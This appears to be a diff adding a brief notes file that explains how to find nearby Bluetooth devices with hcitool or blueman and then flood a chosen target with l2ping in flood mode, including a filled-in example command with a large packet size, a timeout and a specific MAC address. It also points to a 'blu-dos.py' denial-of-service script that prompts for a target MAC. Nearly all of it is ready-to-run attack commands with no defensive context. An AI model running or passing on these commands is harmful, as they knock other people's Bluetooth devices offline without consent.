@@ -1,0 +1,15 @@
+for scan use ==> hcitool scan
+or (blueman) ==> blueman-manager ==> search MAC target
+
+USE --> l2ping
+
+l2ping -i hci0 -s <packet value> -f <MAC_address>
+
+example ==> sudo l2ping -i hci0 -s 512 -t 600 -f 10:B1:F8:7A:68:D0
+                                "size" "time" "MAC"
+
+USE --> BT-dos --> in Work in my git
+
+sudo python blu-dos.py
+
+in script type MAC target 
